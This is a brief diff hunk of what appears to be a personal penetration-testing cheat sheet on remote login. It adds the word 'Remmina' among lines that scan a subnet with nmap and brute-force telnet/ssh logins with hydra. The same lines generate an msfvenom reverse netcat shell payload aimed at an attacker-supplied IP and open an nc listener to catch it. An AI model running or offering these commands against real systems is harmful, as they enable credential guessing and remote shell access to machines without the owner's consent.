@@ -24,6 +24,7 @@ Remort login -->
 nmap -p 22,23,80,3389 192.168.0.0/24
 hydra -L /path/to/user.txt -P /path/to/pass.txt 192.168.0.1 telnet/ssh
 telnet 192.168.0.1
+Remmina
 
 msfvenom -p cmd/unix/reverse_netcat LHOST=<your_ip> LPORT=444
 nc -lnvp 444
